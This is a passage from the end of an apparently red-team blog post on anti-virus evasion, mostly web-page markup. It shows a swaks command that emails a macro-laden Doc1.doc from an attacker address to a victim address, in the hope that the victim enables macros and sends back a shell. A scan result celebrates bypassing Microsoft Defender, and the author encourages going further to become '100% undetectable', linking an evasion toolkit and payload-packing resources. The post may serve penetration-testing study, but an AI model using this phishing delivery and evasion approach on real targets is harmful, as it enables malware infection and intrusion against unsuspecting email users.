https://miro.medium.com/v2/resize:fit:828/format:webp/1*k7dLTxN8VWBisouw2GRJRg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*k7dLTxN8VWBisouw2GRJRg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*k7dLTxN8VWBisouw2GRJRg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*k7dLTxN8VWBisouw2GRJRg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*k7dLTxN8VWBisouw2GRJRg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*k7dLTxN8VWBisouw2GRJRg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*k7dLTxN8VWBisouw2GRJRg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*k7dLTxN8VWBisouw2GRJRg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*k7dLTxN8VWBisouw2GRJRg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*k7dLTxN8VWBisouw2GRJRg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lt nx c" width="700" height="318" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/1*k7dLTxN8VWBisouw2GRJRg.png"></picture></div></div></figure><ul class=""><li id="cecb" class="mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj vt vu vv bh" data-selectable-paragraph="">Sending the file to the victim email:</li></ul><pre class="nn no np nq nr we wf wg wh av ql bh"><span id="7b71" class="ve nz ha wf b iq wi wj l wk wl" data-selectable-paragraph="">swaks -f <a class="af te" href="mailto:attacker@smtp.vps.com" rel="noopener ugc nofollow" target="_blank">attacker@smtp.vps.com</a> -t <a class="af te" href="mailto:victim@gmail.com" rel="noopener ugc nofollow" target="_blank">victim@gmail.com</a> -s smtp.vps.com --header "Subject: HELLO" --body "HELLO" -tls --attach-name Doc1.doc --attach Doc1.doc --suppress-data</span></pre><ul class=""><li id="8532" class="mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj vt vu vv bh" data-selectable-paragraph="">Hopefully, your target will enable the macro and send you a shell, then the last thing to do is to load <code class="cu wp wq wr wf b">stdapi</code> .</li></ul><figure class="nn no np nq nr ns nk nl paragraph-image"><div role="button" tabindex="0" class="nt nu fg nv be nw"><div class="nk nl xp"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*NzjarE50FvxphUEGX-irMg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*NzjarE50FvxphUEGX-irMg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*NzjarE50FvxphUEGX-irMg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*NzjarE50FvxphUEGX-irMg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*NzjarE50FvxphUEGX-irMg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*NzjarE50FvxphUEGX-irMg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NzjarE50FvxphUEGX-irMg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*NzjarE50FvxphUEGX-irMg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*NzjarE50FvxphUEGX-irMg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*NzjarE50FvxphUEGX-irMg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*NzjarE50FvxphUEGX-irMg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*NzjarE50FvxphUEGX-irMg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*NzjarE50FvxphUEGX-irMg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*NzjarE50FvxphUEGX-irMg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lt nx c" width="700" height="117" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/1*NzjarE50FvxphUEGX-irMg.png"></picture></div></div></figure><h1 id="5c6d" class="ny nz ha bc oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot ou ov bh" data-selectable-paragraph="">SCORE?</h1><figure class="nn no np nq nr ns nk nl paragraph-image"><div role="button" tabindex="0" class="nt nu fg nv be nw"><div class="nk nl xq"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*xGuBXxUgDwAOJ8iS5st5xA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*xGuBXxUgDwAOJ8iS5st5xA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*xGuBXxUgDwAOJ8iS5st5xA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*xGuBXxUgDwAOJ8iS5st5xA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*xGuBXxUgDwAOJ8iS5st5xA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*xGuBXxUgDwAOJ8iS5st5xA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xGuBXxUgDwAOJ8iS5st5xA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*xGuBXxUgDwAOJ8iS5st5xA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*xGuBXxUgDwAOJ8iS5st5xA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*xGuBXxUgDwAOJ8iS5st5xA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*xGuBXxUgDwAOJ8iS5st5xA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*xGuBXxUgDwAOJ8iS5st5xA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*xGuBXxUgDwAOJ8iS5st5xA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*xGuBXxUgDwAOJ8iS5st5xA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lt nx c" width="700" height="827" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/1*xGuBXxUgDwAOJ8iS5st5xA.png"></picture></div></div><figcaption class="wt fc tx nk nl wu wv bc b bd z dr" data-selectable-paragraph=""><a class="af te" href="https://antiscan.me/scan/new/result?id=E7Ey7vphMLYP" rel="noopener ugc nofollow" target="_blank">https://antiscan.me/scan/new/result?id=E7Ey7vphMLYP</a></figcaption></figure><p id="369e" class="pw-post-body-paragraph mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj gt bh" data-selectable-paragraph="">Good game Microsoft Defender!</p><h1 id="5412" class="ny nz ha bc oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot ou ov bh" data-selectable-paragraph="">FINAL WORDS</h1><p id="e292" class="pw-post-body-paragraph mm mn ha mo b mp ow mr ms mt ox mv mw mx oy mz na nb oz nd ne nf pa nh ni nj gt bh" data-selectable-paragraph="">You can download the code used in this article and additional tools for anti-virus evasion from <a class="af te" href="https://github.com/Karmaz95/evasion" rel="noopener ugc nofollow" target="_blank">my GitHub</a>. I hope you get the idea of anti-virus evasion and hopefully, it will help you do your job better. Of course, I encourage you to go beyond the techniques I used here to be 100% undetectable. It is also worth mentioning that from April 2022, Microsoft is introducing protection against files downloaded from the internet (<a class="af te" href="https://techcommunity.microsoft.com/t5/microsoft-365-blog/helping-users-stay-safe-blocking-internet-macros-by-default-in/ba-p/3071805" rel="noopener ugc nofollow" target="_blank">MOTW</a>), so as an attacker you should learn new avenues for evasions. A good starting point would be the below links:</p><ul class=""><li id="1cc1" class="mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj vt vu vv bh" data-selectable-paragraph=""><a class="af te" href="https://github.com/mgeeky/PackMyPayload" rel="noopener ugc nofollow" target="_blank">PackMyPayload</a></li><li id="aa10" class="mm mn ha mo b mp vy mr ms mt vz mv mw mx wa mz na nb wb nd ne nf wc nh ni nj vt vu vv bh" data-selectable-paragraph=""><a class="af te" href="https://www.whiteoaksecurity.com/blog/2020-3-11-alternative-execution-a-macro-saga-part-1/" rel="noopener ugc nofollow" target="_blank">Macro Saga</a></li><li id="1053" class="mm mn ha mo b mp vy mr ms mt vz mv mw mx wa mz na nb wb nd ne nf wc nh ni nj vt vu vv bh" data-selectable-paragraph=""><a class="af te" href="https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/av-edr-evasion" rel="noopener ugc nofollow" target="_blank">AV / EDR Evasion</a></li><li id="3f84" class="mm mn ha mo b mp vy mr ms mt vz mv mw mx wa mz na nb wb nd ne nf wc nh ni nj vt vu vv bh" data-selectable-paragraph=""><a class="af te" href="https://medium.com/@markmotig/quick-introduction-to-confuserex-ce373553138f" rel="noopener">ConfuserEX</a></li></ul></div></div></div></div></section></div></div></article><div class="ab by"><div class="cf be fx fy fz ga"></div></div></div><div class="ab by"><div class="cf be fx fy fz ga"><div class="xr xs ab jc"><div class="qw ab"><a class="tw av am ao" href="https://medium.com/tag/cybersecurity?source=post_page-----aa0742d806db---------------cybersecurity-----------------" rel="noopener follow"><div class="qe fg cu xt gc xu xv bc b bd z bh xw">Cybersecurity</div></a></div><div class="qw ab"><a class="tw av am ao" href="https://medium.com/tag/information-technology?source=post_page-----aa0742d806db---------------information_technology-----------------" rel="noopener follow"><div class="qe fg cu xt gc xu xv bc b bd z bh xw">Information Technology</div></a></div><div class="qw ab"><a class="tw av am ao" href="https://medium.com/tag/information-security?source=post_page-----aa0742d806db---------------information_security-----------------" rel="noopener follow"><div class="qe fg cu xt gc xu xv bc b bd z bh xw">Information Security</div></a></div><div class="qw ab"><a class="tw av am ao" href="https://medium.com/tag/windows?source=post_page-----aa0742d806db---------------windows-----------------" rel="noopener follow"><div class="qe fg cu xt gc xu xv bc b bd z bh xw">Windows</div></a></div><div class="qw ab"><a class="tw av am ao" href="https://medium.com/tag/malware?source=post_page-----aa0742d806db---------------malware-----------------" rel="noopener follow"><div class="qe fg cu xt gc xu xv bc b bd z bh xw">Malware</div></a></div></div></div></div><div class="l"></div><footer class="pb pc pd pe pf pg ph pi gs ab q pj pk c"><div class="l ae"><div class="ab by"><div class="cf be fx fy fz ga"><div class="ab cm pl"><div class="ab q kl"><div class="pm l"><span class="l pn po pp e d"><div class="ab q kl km"><div class="pw-multi-vote-icon fg gq kn ko kp"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2Faa0742d806db&amp;operation=register&amp;redirect=https%3A%2F%2Fkarol-mazurek.medium.com%2Fav-evasion-techniques-aa0742d806db&amp;user=Karol+Mazurek&amp;userId=3f7ab05f0f68&amp;source=-----aa0742d806db---------------------clap_footer-----------" rel="noopener follow"><div><div class="bj" aria-hidden="false" aria-describedby="9" aria-labelledby="9"><div class="kq ao kr ks kt ku am kv kw kx kp"><svg width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" clip-rule="evenodd" d="M11.37.83L12 3.28l.63-2.45h-1.26zM13.92 3.95l1.52-2.1-1.18-.4-.34 2.5zM8.59 1.84l1.52 2.11-.34-2.5-1.18.4zM18.52 18.92a4.23 4.23 0 0 1-2.62 1.33l.41-.37c2.39-2.4 2.86-4.95 1.4-7.63l-.91-1.6-.8-1.67c-.25-.56-.19-.98.21-1.29a.7.7 0 0 1 .55-.13c.28.05.54.23.72.5l2.37 4.16c.97 1.62 1.14 4.23-1.33 6.7zm-11-.44l-4.15-4.15a.83.83 0 0 1 1.17-1.17l2.16 2.16a.37.37 0 0 0 .51-.52l-2.15-2.16L3.6 11.2a.83.83 0 0 1 1.17-1.17l3.43 3.44a.36.36 0 0 0 .52 0 .36.36 0 0 0 0-.52L5.29 9.51l-.97-.97a.83.83 0 0 1 0-1.16.84.84 0 0 1 1.17 0l.97.97 3.44 3.43a.36.36 0 0 0 .51 0 .37.37 0 0 0 0-.52L6.98 7.83a.82.82 0 0 1-.18-.9.82.82 0 0 1 .76-.51c.22 0 .43.09.58.24l5.8 5.79a.37.37 0 0 0 .58-.42L13.4 9.67c-.26-.56-.2-.98.2-1.29a.7.7 0 0 1 .55-.13c.28.05.55.23.73.5l2.2 3.86c1.3 2.38.87 4.59-1.29 6.75a4.65 4.65 0 0 1-4.19 1.37 7.73 7.73 0 0 1-4.07-2.25zm3.23-12.5l2.12 2.11c-.41.5-.47 1.17-.13 1.9l.22.46-3.52-3.53a.81.81 0 0 1-.1-.36c0-.23.09-.43.24-.59a.85.85 0 0 1 1.17 0zm7.36 1.7a1.86 1.86 0 0 0-1.23-.84 1.44 1.44 0 0 0-1.12.27c-.3.24-.5.55-.58.89-.25-.25-.57-.4-.91-.47-.28-.04-.56 0-.82.1l-2.18-2.18a1.56 1.56 0 0 0-2.2 0c-.2.2-.33.44-.4.7a1.56 1.56 0 0 0-2.63.75 1.6 1.6 0 0 0-2.23-.04 1.56 1.56 0 0 0 0 2.2c-.24.1-.5.24-.72.45a1.56 1.56 0 0 0 0 2.2l.52.52a1.56 1.56 0 0 0-.75 2.61L7 19a8.46 8.46 0 0 0 4.48 2.45 5.18 5.18 0 0 0 3.36-.5 4.89 4.89 0 0 0 4.2-1.51c2.75-2.77 2.54-5.74 1.43-7.59L18.1 7.68z"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l ky kz la lb lc ld le"><div><div class="bj" aria-hidden="false" aria-describedby="67" aria-labelledby="67"><p class="bc b ds z dr"><button class="af ag ah ai aj ak al am an ao ap aq ar as at tq lm">28<span class="l h g f pq pr"></span></button></p></div></div></div></div></span><span class="l h g f pq pr"><div class="ab q kl km"><div class="pw-multi-vote-icon fg gq kn ko kp"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2Faa0742d806db&amp;operation=register&amp;redirect=https%3A%2F%2Fkarol-mazurek.medium.com%2Fav-evasion-techniques-aa0742d806db&amp;user=Karol+Mazurek&amp;userId=3f7ab05f0f68&amp;source=-----aa0742d806db---------------------clap_footer-----------" rel="noopener follow"><div><div class="bj" aria-hidden="false" aria-describedby="10" aria-labelledby="10"><div class="kq ao kr ks kt ku am kv kw kx kp"><svg width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" clip-rule="evenodd" d="M11.37.83L12 3.28l.63-2.45h-1.26zM13.92 3.95l1.52-2.1-1.18-.4-.34 2.5zM8.59 1.84l1.52 2.11-.34-2.5-1.18.4zM18.52 18.92a4.23 4.23 0 0 1-2.62 1.33l.41-.37c2.39-2.4 2.86-4.95 1.4-7.63l-.91-1.6-.8-1.67c-.25-.56-.19-.98.21-1.29a.7.7 0 0 1 .55-.13c.28.05.54.23.72.5l2.37 4.16c.97 1.62 1.14 4.23-1.33 6.7zm-11-.44l-4.15-4.15a.83.83 0 0 1 1.17-1.17l2.16 2.16a.37.37 0 0 0 .51-.52l-2.15-2.16L3.6 11.2a.83.83 0 0 1 1.17-1.17l3.43 3.44a.36.36 0 0 0 .52 0 .36.36 0 0 0 0-.52L5.29 9.51l-.97-.97a.83.83 0 0 1 0-1.16.84.84 0 0 1 1.17 0l.97.97 3.44 3.43a.36.36 0 0 0 .51 0 .37.37 0 0 0 0-.52L6.98 7.83a.82.82 0 0 1-.18-.9.82.82 0 0 1 .76-.51c.22 0 .43.09.58.24l5.8 5.79a.37.37 0 0 0 .58-.42L13.4 9.67c-.26-.56-.2-.98.2-1.29a.7.7 0 0 1 .55-.13c.28.05.55.23.73.5l2.2 3.86c1.3 2.38.87 4.59-1.29 6.75a4.65 4.65 0 0 1-4.19 1.37 7.73 7.73 0 0 1-4.07-2.25zm3.23-12.5l2.12 2.11c-.41.5-.47 1.17-.13 1.9l.22.46-3.52-3.53a.81.81 0 0 1-.1-.36c0-.23.09-.43.24-.59a.85.85 0 0 1 1.17 0zm7.36 1.7a1.86 1.86 0 0 0-1.23-.84 1.44 1.44 0 0 0-1.12.27c-.3.24-.5.55-.58.89-.25-.25-.57-.4-.91-.47-.28-.04-.56 0-.82.1l-2.18-2.18a1.56 1.56 0 0 0-2.2 0c-.2.2-.33.44-.4.7a1.56 1.56 0 0 0-2.63.75 1.6 1.6 0 0 0-2.23-.04 1.56 1.56 0 0 0 0 2.2c-.24.1-.5.24-.72.45a1.56 1.56 0 0 0 0 2.2l.52.52a1.56 1.56 0 0 0-.75 2.61L7 19a8.46 8.46 0 0 0 4.48 2.45 5.18 5.18 0 0 0 3.36-.5 4.89 4.89 0 0 0 4.2-1.51c2.75-2.77 2.54-5.74 1.43-7.59L18.1 7.68z"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l ky kz la lb lc ld le"><div><div class="bj" aria-hidden="false" aria-describedby="69" aria-labelledby="69"><p class="bc b ds z dr"><button class="af ag ah ai aj ak al am an ao ap aq ar as at tq lm">28</button></p></div></div></div></div></span></div><div class="bn ab"><div><div class="bj" aria-hidden="false" aria-describedby="11" aria-labelledby="11"><button class="ao kq lh li ab q fh lj lk" aria-label="responses"><svg width="24" height="24" viewBox="0 0 24 24" class="hw"><path d="M18 16.8a7.14 7.14 0 0 0 2.24-5.32c0-4.12-3.53-7.48-8.05-7.48C7.67 4 4 7.36 4 11.48c0 4.13 3.67 7.48 8.2 7.48a8.9 8.9 0 0 0 2.38-.32c.23.2.48.39.75.56 1.06.69 2.2 1.04 3.4 1.04.22 0 .4-.11.48-.29a.5.5 0 0 0-.04-.52 6.4 6.4 0 0 1-1.16-2.65v.02zm-3.12 1.06l-.06-.22-.32.1a8 8 0 0 1-2.3.33c-4.03 0-7.3-2.96-7.3-6.59S8.17 4.9 12.2 4.9c4 0 7.1 2.96 7.1 6.6 0 1.8-.6 3.47-2.02 4.72l-.2.16v.26l.02.3a6.74 6.74 0 0 0 .88 2.4 5.27 5.27 0 0 1-2.17-.86c-.28-.17-.72-.38-.94-.59l.01-.02z"></path></svg><p class="bc b bd z dr"><span class="pw-responses-count lg hw">2</span></p></button></div></div></div></div><div class="ab q"><div class="ps l iz"><div><div class="bj" aria-hidden="false" aria-describedby="12" aria-labelledby="12"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerBookmarkButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2Faa0742d806db&amp;operation=register&amp;redirect=https%3A%2F%2Fkarol-mazurek.medium.com%2Fav-evasion-techniques-aa0742d806db&amp;source=--------------------------bookmark_footer-----------" rel="noopener follow"><svg width="25" height="25" viewBox="0 0 25 25" fill="none" class="dr lm" aria-label="Add to list bookmark button"><path d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18V2.5zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .8.4l5.7-4.4 5.7 4.4a.5.5 0 0 0 .8-.4v-8.5a.5.5 0 0 0-1 0v7.48l-5.2-4a.5.5 0 0 0-.6 0l-5.2 4V7z" fill="currentColor"></path></svg></a></span></div></div></div><div class="ps l iz"><div class="bj" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bj" aria-hidden="false" aria-describedby="13" aria-labelledby="13"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="footerSocialShareButton" class="af fh ah ai aj ak al lu an ao ap eu lv lw lk lx"><svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path fill-rule="evenodd" clip-rule="evenodd" d="M15.22 4.93a.42.42 0 0 1-.12.13h.01a.45.45 0 0 1-.29.08.52.52 0 0 1-.3-.13L12.5 3v7.07a.5.5 0 0 1-.5.5.5.5 0 0 1-.5-.5V3.02l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.8a.42.42 0 0 1 .07.5zm-.1.14zm.88 2h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11a2 2 0 0 1-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.14c.1.1.15.22.15.35a.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9V8.96c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1z" fill="currentColor"></path></svg></button></div></div></div></div></div></div></div></div></div></footer><div class="pt pu pv pw px l bu"><div class="ab by"><div class="cf be fx fy fz ga"><div class="ci ab py cm"><div class="ab ih"><a rel="noopener follow" href="/?source=post_page-----aa0742d806db--------------------------------"><div class="l pz qa bv qb il"><div class="l fg"><img alt="Karol Mazurek" class="l fa bv qc qd cu" src="https://miro.medium.com/v2/da:true/resize:fill:144:144/0*BLalJfMaz_JDj6fg" width="72" height="72" loading="lazy"><div class="im bv l qc qd fp n in fq"></div></div></div></a></div><div class="j i d"><div class="ab"><span><button class="bc b bd z el qe em eo ep eq er es et eu ev ew ex qf ey ez fa bj fb fc">Follow</button></span><div class="dq l"><div><div><div class="bj" aria-hidden="false" aria-describedby="111" aria-labelledby="111"><div class="l"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/m/signin?actionUrl=%2F_%2Fapi%2Fsubscriptions%2Fnewsletters%2Fe71c64288bc8&amp;operation=register&amp;redirect=https%3A%2F%2Fkarol-mazurek.medium.com%2Fav-evasion-techniques-aa0742d806db&amp;newsletterV3=3f7ab05f0f68&amp;newsletterV3Id=e71c64288bc8&amp;user=Karol+Mazurek&amp;userId=3f7ab05f0f68&amp;source=-----aa0742d806db---------------------subscribe_user-----------" rel="noopener follow"><button class="bc b bd z el am em eo ep eq er es et eu ev ew ex ey ez fa bj fb fc" aria-label="Subscribe"><svg width="38" height="38" viewBox="0 0 38 38" fill="none" class="xy qh qi"><rect x="26.25" y="9.25" width="0.5" height="6.5" rx="0.25"></rect><rect x="29.75" y="12.25" width="0.5" height="6.5" rx="0.25" transform="rotate(90 29.75 12.25)"></rect><path d="M19.5 12.5h-7a1 1 0 0 0-1 1v11a1 1 0 0 0 1 1h13a1 1 0 0 0 1-1v-5"></path><path d="M11.5 14.5L19 20l4-3"></path></svg></button></a></span></div></div></div></div></div></div></div></div><div class="ab ck cm"><div class="l"><div class="ab q"><a class="af ag ah ai aj ak al am an ao ap aq ar as at ab q" rel="noopener follow" href="/?source=post_page-----aa0742d806db--------------------------------"><h2 class="pw-author-name bc qs qt qu qv bh"><span class="gt je">Written by <!-- -->Karol Mazurek</span></h2></a></div><div class="qw ab"><div class="l iz"><span class="pw-follower-count bc b bd z bh"><a class="af ag ah ai aj ak al am an ao ap aq ar is" rel="noopener follow" href="/followers?source=post_page-----aa0742d806db--------------------------------">1.1K Followers</a></span></div></div><div class="qx l"><p class="bc b bd z bh"><span class="gt">Offensive Security Engineer</span></p></div></div><div class="h k"><div class="ab"><span><button class="bc b bd z el qe em eo ep eq er es et eu ev ew ex qf ey ez fa bj fb fc">Follow</button></span><div class="dq l"><div><div><div class="bj" aria-hidden="false" aria-describedby="112" aria-labelledby="112"><div class="l"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/m/signin?actionUrl=%2F_%2Fapi%2Fsubscriptions%2Fnewsletters%2Fe71c64288bc8&amp;operation=register&amp;redirect=https%3A%2F%2Fkarol-mazurek.medium.com%2Fav-evasion-techniques-aa0742d806db&amp;newsletterV3=3f7ab05f0f68&amp;newsletterV3Id=e71c64288bc8&amp;user=Karol+Mazurek&amp;userId=3f7ab05f0f68&amp;source=-----aa0742d806db---------------------subscribe_user-----------" rel="noopener follow"><button class="bc b bd z el am em eo ep eq er es et eu ev ew ex ey ez fa bj fb fc" aria-label="Subscribe"><svg width="38" height="38" viewBox="0 0 38 38" fill="none" class="xy qh qi"><rect x="26.25" y="9.25" width="0.5" height="6.5" rx="0.25"></rect><rect x="29.75" y="12.25" width="0.5" height="6.5" rx="0.25" transform="rotate(90 29.75 12.25)"></rect><path d="M19.5 12.5h-7a1 1 0 0 0-1 1v11a1 1 0 0 0 1 1h13a1 1 0 0 0 1-1v-5"></path><path d="M11.5 14.5L19 20l4-3"></path></svg></button></a></span></div></div></div></div></div></div></div></div><div class="qy be qz gl gm gn go gp"></div></div></div><div class="h k j"><div class="qy be qz ra"></div><div class="ab by"><div class="cf be fx fy fz ga"><div class="rb ab kl jc"><div class="rc rd l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://help.medium.com/hc/en-us?source=post_page-----aa0742d806db--------------------------------" rel="noopener follow"><p class="bc b ds z dr">Help</p></a></div><div class="rc rd l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.statuspage.io/?source=post_page-----aa0742d806db--------------------------------" rel="noopener follow"><p class="bc b ds z dr">Status</p></a></div><div class="rc rd l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/about?autoplay=1&amp;source=post_page-----aa0742d806db--------------------------------" rel="noopener follow"><p class="bc b ds z dr">About</p></a></div><div class="rc rd l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----aa0742d806db--------------------------------" rel="noopener follow"><p class="bc b ds z dr">Careers</p></a></div><div class="rc rd l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="mailto:pressinquiries@medium.com?source=post_page-----aa0742d806db--------------------------------" rel="noopener follow"><p class="bc b ds z dr">Press</p></a></div><div class="rc rd l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://blog.medium.com/?source=post_page-----aa0742d806db--------------------------------" rel="noopener follow"><p class="bc b ds z dr">Blog</p></a></div><div class="rc rd l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----aa0742d806db--------------------------------" rel="noopener follow"><p class="bc b ds z dr">Privacy</p></a></div><div class="rc rd l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----aa0742d806db--------------------------------" rel="noopener follow"><p class="bc b ds z dr">Terms</p></a></div><div class="rc rd l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" 